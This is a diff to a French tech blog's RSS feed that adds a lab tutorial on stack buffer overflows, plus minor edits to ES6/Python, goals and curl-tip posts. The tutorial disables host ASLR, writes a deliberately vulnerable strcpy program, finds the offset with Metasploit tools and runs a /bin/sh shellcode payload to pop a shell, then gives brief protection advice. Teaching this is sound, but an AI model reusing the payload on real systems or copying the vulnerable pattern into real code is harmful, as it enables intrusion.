@@ -5,8 +5,106 @@
         <description>Recent content in Posts on Lean Deep Tech blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Wed, 16 Feb 2022 07:49:00 +0200</lastBuildDate>
+        <lastBuildDate>Fri, 25 Feb 2022 10:59:00 +0000</lastBuildDate>
         <atom:link href="https://leandeep.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Se protéger des failles buffer overflow</title>
+            <link>https://leandeep.com/se-prot%C3%A9ger-des-failles-buffer-overflow/</link>
+            <pubDate>Fri, 25 Feb 2022 10:59:00 +0000</pubDate>
+            
+            <guid>https://leandeep.com/se-prot%C3%A9ger-des-failles-buffer-overflow/</guid>
+            <description>L&amp;rsquo;idée du débordement de tampon (buffer overflow en anglais) est d&amp;rsquo;écrire des instructions supplémentaires dans les registres dans le but de pouvoir injecter et exécuter du code malveillant.
+L&amp;rsquo;idée de cette attaque est d&amp;rsquo;injecter du code malveillant grâce au buffer flow, de récupérer les adresses EIP de ces instructions et d&amp;rsquo;insérer ces adresses EIP dans une stack frame entre les registres EBP et ESP pour qu&amp;rsquo;elles soient exécutées.
+Pour les processeurs 32 bits:</description>
+            <content type="html"><![CDATA[<p>L&rsquo;idée du débordement de tampon (buffer overflow en anglais) est d&rsquo;écrire des instructions supplémentaires dans les registres dans le but de pouvoir injecter et exécuter du code malveillant.</p>
+<p>L&rsquo;idée de cette attaque est d&rsquo;injecter du code malveillant grâce au buffer flow, de récupérer les adresses EIP de ces instructions et d&rsquo;insérer ces adresses EIP dans une stack frame entre les registres EBP et ESP pour qu&rsquo;elles soient exécutées.</p>
+<p>Pour les processeurs 32 bits:</p>
+<ul>
+<li>EIP: registre qui contient l&rsquo;adresse mémoire des prochaines instructions qui seront exécutées.</li>
+<li>Les registres EBP (début) et ESP (fin) délimitent des stack frames. Lorsque une stack frame est pleine, elle est envoyée dans l&rsquo;EIP pour être exécutée.</li>
+</ul>
+<p><br/>
+Démarrer un container poubelle sur un Host 32 bits. <code>--privileged</code> est indispensable pour modifier l&rsquo;ASLR et installer ensuite les outils nécessaires.</p>
+<pre><code>docker run -it --rm --privileged --pid=host ubuntu bash
+apt update &amp;&amp; apt install -y vim gcc gcc-multilib build-essential gdb git python-dev-is-python2 curl ruby-full
+
+# Installation de peda pour trouver l'offset (nombre de caractères à insérer avant d'être en buffer overflow)
+git clone https://github.com/longld/peda.git ~/peda &amp;&amp; echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
+
+# Installation de metasploit
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall
+mkdir Dev &amp;&amp; cd $_ &amp;&amp; git clone https://github.com/rapid7/metasploit-framework --depth 1
+</code></pre><p><br/>
+Désactiver l&rsquo;ASLR. ⚠ pensez à le réactiver car c&rsquo;est le host qui est modifié ici, pas le container. (Faites le test avec un nouveau container flambant neuf)</p>
+<pre><code>cat /proc/sys/kernel/randomize_va_space
+echo 0 &gt; /proc/sys/kernel/randomize_va_space
+cat /proc/sys/kernel/randomize_va_space
+</code></pre><p><br/>
+Créer un fichier C avec une faille buffer overflow: <code>mkdir Dev &amp;&amp; $_ &amp;&amp; vim hello.c</code></p>
+<pre><code>#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+
+void sayHello(char *arg) {
+  char buffer[20];
+  strcpy(buffer, arg);
+  printf(&quot;hello %s\n&quot;, buffer);
+}
+
+int main(int argc, char** argv) {
+  sayHello(argv[1]);
+  return 0;
+}
+</code></pre><p><br/>
+On compile:</p>
+<pre><code>gcc -z execstack -fno-stack-protector -m32 hello.c -o hello
+</code></pre><br/>
+<p>On exécute le binaire: <code>./hello World</code>.</p>
+<pre><code>hello World
+</code></pre><p>On exécute le binaire: <code>./hello Olivierrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr</code> avec un débordement du buffer</p>
+<pre><code>hello Olivierrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr
+Segmentation fault
+</code></pre><br/>
+<p>Trouver l&rsquo;offset:</p>
+<pre><code># Ouvrir un terminal et exécuter:
+# Générer une string aléaire à utiliser comme paramètre du programme hello
+cd Dev/metasploit-framework/tools/exploit
+gem install rex-text
+./pattern_create.rb -l 100
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+# Dans un second terminal
+gdb ./hello
+gdb-peda$ run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+</code></pre><p><img src="/images/buffer-overflow-offset-gdb.png" alt="image"></p>
+<p>Puis dans le premier terminal exécuter:</p>
+<pre><code>./pattern_offset.rb -q 0Ab1
+</code></pre><p><strong>[*] Exact match at offset 32</strong></p>
+<p><br/>
+EIP contient l&rsquo;adresse des instructions à exécuter. Donc on récupère l&rsquo;ESP (la fin) de la stack frame précédente</p>
+<pre><code>run $(python -c &quot;print 'A'*32&quot;)
+info frame
+print $esp
+</code></pre><p><strong>&ndash;&gt; 0xffffd700</strong></p>
+<p>On se cale dessus et on exécute notre shell code.
+On transforme &lsquo;0xffffd700&rsquo; -&gt; &lsquo;\x00\xd7\xff\xff&rsquo;</p>
+<p>Pour le Shell code, rendez-vous sur  <a href="http://shell-storm.org/shellcode/files/shellcode-827.php">http://shell-storm.org/shellcode/files/shellcode-827.php</a></p>
+<pre><code>./hello $(python -c &quot;print 'A'*32  + '\x00\xd7\xff\xff' + '\x90'*40 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'&quot;)
+</code></pre><p>Et voilà, vous verrez apparaître un shell&hellip;</p>
+<br/>
+<h2 id="protection">Protection</h2>
+<ul>
+<li>Activer l&rsquo;ASLR (Address Space Layout Randomization)</li>
+</ul>
+<pre><code>cat /proc/sys/kernel/randomize_va_space 
+# Si 2 --&gt; c'est activé; all good
+</code></pre><br/>
+<ul>
+<li>Ecrire du code plus robuste</li>
+</ul>
+]]></content>
+        </item>
         
         <item>
             <title>ES6 pour développeurs Python</title>
@@ -14,8 +112,10 @@
             <pubDate>Wed, 16 Feb 2022 07:49:00 +0200</pubDate>
             
             <guid>https://leandeep.com/es6-pour-d%C3%A9veloppeurs-python/</guid>
-            <description>Python 1. Variables dans des strings name = &#39;olivier&#39; value = f&#34;&#34;&#34;Hello, {name}! Welcome!&#34;&#34;&#34; price = 7.5 print(f&#34;Prix: {price:.2f} €&#34;) # Prix: 7.50 €   2. Iterator for item in [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;]: print(item)    3. Sets mon_set = set([&#39;titi&#39;]) mon_set.add(&#39;tata&#39;) mon_set.add(&#39;toto&#39;) &#39;titi&#39; in mon_set len(mon_set) == 3 for elem in mon_set: print(elem) mon_set.remove(&#39;C&#39;)   4. Generators def countdown(counter): while counter  0: yield counter counter -= 1 for counter in countdown(10): print(counter)    5.</description>
-            <content type="html"><![CDATA[
+            <description>Pour que le code React, et JavaScript plus généralement, ne soit pas trop moche; il faut s&amp;rsquo;inspirer de Python ahahah&amp;hellip;
+Python 1. Variables dans des strings name = &#39;olivier&#39; value = f&#34;&#34;&#34;Hello, {name}! Welcome!&#34;&#34;&#34; price = 7.5 value = f&#34;Prix: {price:.2f} €&#34; print(value) # Prix: 7.50 €   2. Iterator for item in [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;]: print(item)    3. Sets mon_set = set([&#39;titi&#39;]) mon_set.add(&#39;tata&#39;) mon_set.add(&#39;toto&#39;) &#39;titi&#39; in mon_set len(mon_set) == 3 for elem in mon_set: print(elem) mon_set.</description>
+            <content type="html"><![CDATA[<p>Pour que le code React, et JavaScript plus généralement, ne soit pas trop moche; il faut s&rsquo;inspirer de Python ahahah&hellip;</p>
+
 
 <div style="width: 100%; float: left; position: relative;">
   
@@ -31,7 +131,8 @@ value = f"""Hello, {name}!
 Welcome!"""
 
 price = 7.5
-print(f"Prix: {price:.2f} €")
+value = f"Prix: {price:.2f} €"
+print(value)
 # Prix: 7.50 €</code>
 </pre>
     </div>
@@ -84,7 +185,8 @@ for counter in countdown(10):
 <code>a = 1
 b = 2
 a, b = b, a
-first, second, *the_rest = [1, 2, 3, 4]</code>
+first, second, *the_rest = [1, 2, 3, 4]
+</code>
 </pre>
     </div>
     <!-- -->
@@ -368,7 +470,51 @@ except CustomException as err:
 finally: 
   print('Finishing')
   
+
+
   </code>
+</pre>
+    </div>
+    <!-- -->
+    <!-- -->
+    <div style="width:100%; padding-top: 20px;">
+      <b>26. Import</b>
+<pre style="margin: 0px; padding: 5px;">
+<code>import math
+print(math.log(42))
+
+from math import log
+print(log(42))
+
+from math import *
+print(log(42))</code>
+</pre>
+    </div>
+    <!-- -->
+    <!-- -->
+    <div style="width:100%; padding-top: 20px;">
+      <b>27. Range</b>
+<pre style="margin: 0px; padding: 5px;">
+<code>print(range(5))</code>
+</pre>
+    </div>
+    <!-- -->
+    <!-- -->
+    <div style="width:100%; padding-top: 20px;">
+      <b>28. Comprehensions</b>
+<pre style="margin: 0px; padding: 5px;">
+<code>names = [c.name for c in friends if c.friendly]
+</code>
+</pre>
+    </div>
+    <!-- -->
+    <!-- -->
+    <div style="width:100%; padding-top: 20px;">
+      <b>29. Dict creation</b>
+<pre style="margin: 0px; padding: 5px;">
+<code>x = 42
+y = 43
+mon_dict = {"x": x, "y": y}</code>
 </pre>
     </div>
     <!-- -->
@@ -392,8 +538,9 @@ value = `Hello, ${name}!
 Welcome!`;
 
 price = 7.5;
-console.log(`Prix ${price.toFixed(2)} €`);
-// 'Price: 7.50 </code>
+value = `Prix ${price.toFixed(2)} €`;
+console.log(value);
+// 'Price: 7.50</code>
 </pre>
     </div>
     <!-- -->
@@ -609,7 +756,8 @@ total = items.reduce(
  (total, current) => total + current
 );
 
-// 10</code>
+// 10
+</code>
 </pre>
     </div>
     <!-- -->
@@ -735,11 +883,51 @@ try {
 </pre>
     </div>
     <!-- -->
+    <!-- -->
+    <div style="width:100%; padding-top: 20px;">
+      <b>26. Import</b>
+<pre style="margin: 0px; padding: 5px;">
+<code>import math from math;
+console.log(math.log(42));
+
+import { log } from math;
+console.log(log(42));
+
+import * from math;
+console.log(log(42));</code>
+</pre>
+    </div>
+    <!-- -->
+    <!-- -->
+    <div style="width:100%; padding-top: 20px;">
+      <b>27. Range</b>
+<pre style="margin: 0px; padding: 5px;">
+<code>console.log(Array.from(new Array(5), (x,i) => i));</code>
+</pre>
+    </div>
+    <!-- -->
+    <!-- -->
+    <div style="width:100%; padding-top: 20px;">
+      <b>28. Comprehensions</b>
+<pre style="margin: 0px; padding: 5px;">
+<code>//To double check with Babel
+let names = [for (c of friends) if (c.friendly) c.name]</code>
+</pre>
+    </div>
+    <!-- -->
+    <!-- -->
+    <div style="width:100%; padding-top: 20px;">
+      <b>29. Dict creation</b>
+<pre style="margin: 0px; padding: 5px;">
+<code>let x = 42, y = 43
+let mon_dict = {x, y}</code>
+</pre>
+    </div>
+    <!-- -->
   </div>
 
 </div>
 </div>
-
 
 
 ]]></content>
@@ -1673,11 +1861,11 @@ Matrix(0.1, 0.2, 1.1, 2.2)
             
             <guid>https://leandeep.com/et-vous-quels-sont-vos-projets-pour-2022/</guid>
             <description>Chaque année, j&amp;rsquo;aime me fixer des objectifs professionnels en supplément de mon activité principale.
-Voici donc mon programme pour l&amp;rsquo;année 2022 (beaucoup plus simple que l&amp;rsquo;annéee 2021). En gros cela se résume en 5 maîtres-mots: Blockchain, Rust, Trading, Veille Innovation.
+Voici donc mon programme pour l&amp;rsquo;année 2022 (beaucoup plus simple que l&amp;rsquo;annéee 2021). En gros cela se résume en 5 maîtres-mots: Blockchain, Rust, Trading, Veille &amp;amp; Innovation.
  1. Utiliser Rust pour tous mes développements personnels (&amp;ldquo;développements professionels à usage personnel&amp;rdquo; devrais-je plutôt écrire) #TopPrio1
  Torrent client app (wrap C++ lib en Rust) expérimentation Secu app (sur Mobile device) Notification app (un socle très simple et utilisable via API call en local pour toutes mes automations) (gui natif OS X) Cross-platform expérimentation lib/app (lib Rust partagée sur Android et iOS, et/ou Flutter et/ou Webassembly) 2 Apps: voir les points 2.</description>
             <content type="html"><![CDATA[<p>Chaque année, j&rsquo;aime me fixer des objectifs professionnels <strong>en supplément de</strong> mon activité principale.</p>
-<p>Voici donc mon programme pour l&rsquo;année 2022 (beaucoup plus simple que l&rsquo;annéee 2021). En gros cela se résume en 5 maîtres-mots: <code>Blockchain</code>, <code>Rust</code>, <code>Trading</code>, <code>Veille Innovation</code>.</p>
+<p>Voici donc mon programme pour l&rsquo;année 2022 (beaucoup plus simple que l&rsquo;annéee 2021). En gros cela se résume en 5 maîtres-mots: <code>Blockchain</code>, <code>Rust</code>, <code>Trading</code>, <code>Veille</code> &amp; <code>Innovation</code>.</p>
 <br/>
 <p><strong>1. Utiliser Rust pour tous mes développements personnels</strong> (&ldquo;développements professionels à usage personnel&rdquo; devrais-je plutôt écrire) #TopPrio1</p>
 <ul>
@@ -1706,7 +1894,7 @@ Voici donc mon programme pour l&amp;rsquo;année 2022 (beaucoup plus simple que 
 <li>Price tracking/alerting app nécessaire (Rust) pour projets crypto à forts portentiels (revente auto de positions à différents échelons)</li>
 <li>Euronext vision 360 tracker (une v2 en RPA)</li>
 </ul>
-<p><strong>5. Ethical hacking</strong> (par passion depuis toujours) #Fun</p>
+<p><strong>5. Ethical hacking</strong> (par passion depuis toujours)</p>
 <p><strong>6. Lire un livre de développement personnel</strong></p>
 <p><strong>7. Creuser React 360 si le temps le permet</strong> et builder une petite interface compatible Oculus/Meta Quest 2 + étudier comment se construisent les environnements de jeux vidéo/ simulation avec des personnages animés en VR (peut être bcp plus évolués que React 360) #Veille</p>
 <p><strong>8. Monter un node Chainlink</strong> si ROI et bande passante #Profit</p>
@@ -25459,6 +25647,22 @@ Il est le test du χ² le plus communément utilisé.</p>
 <p><img src="/images/multimodale.png" alt="image"></p>
 <p>La multimodalité d&rsquo;une distribution dans un échantillon indique généralement que la distribution de la variable dans la population n&rsquo;est pas normale. La multimodalité d&rsquo;une distribution peut fournir une information importante quant à la nature de la variable étudiée (c&rsquo;est-à-dire la qualité mesurée). Par exemple, si la variable en question représente une préférence ou une attitude déclarée, la multimodalité peut indiquer qu&rsquo;il existe plusieurs points de vue ou structures de réponse dans le questionnaire. Toutefois, dans la plupart des cas, la multimodalité indique que l&rsquo;échantillon n&rsquo;est pas homogène et que les observations proviennent de deux distributions (ou davantage) qui se &ldquo;chevauchent&rdquo;. Parfois, la multimodalité d&rsquo;une distribution peut révéler des problèmes au niveau de l&rsquo;instrument de mesure (par exemple, des &ldquo;problèmes de calibration de l&rsquo;appareil&rdquo; en sciences naturelles ou un &ldquo;biais dans les réponses&rdquo; en sciences sociales).</p>
 ]]></content>
+        </item>
+        
+        <item>
+            <title>Mesurer le temps de réponse d&#39;un curl</title>
+            <link>https://leandeep.com/mesurer-le-temps-de-r%C3%A9ponse-dun-curl/</link>
+            <pubDate>Fri, 02 Jan 2015 10:59:00 +0000</pubDate>
+            
+            <guid>https://leandeep.com/mesurer-le-temps-de-r%C3%A9ponse-dun-curl/</guid>
+            <description>Petit tip de 2 seconds montrant comment afficher le temps de réponse d&amp;rsquo;une request via CURL
+curl -X &#39;GET&#39; \ &#39;https://...&#39; \ -H &#39;accept: application/json&#39; \ -s -o /dev/null -w &amp;quot;\n\n--&amp;gt; %{time_starttransfer} seconds\n&amp;quot; </description>
+            <content type="html"><![CDATA[<p>Petit tip de 2 seconds montrant comment afficher le temps de réponse d&rsquo;une request via <code>CURL</code></p>
+<pre><code>curl -X 'GET' \
+  'https://...' \
+  -H 'accept: application/json' \
+  -s -o /dev/null -w &quot;\n\n--&gt; %{time_starttransfer} seconds\n&quot;
+</code></pre>]]></content>
         </item>
         
         <item>
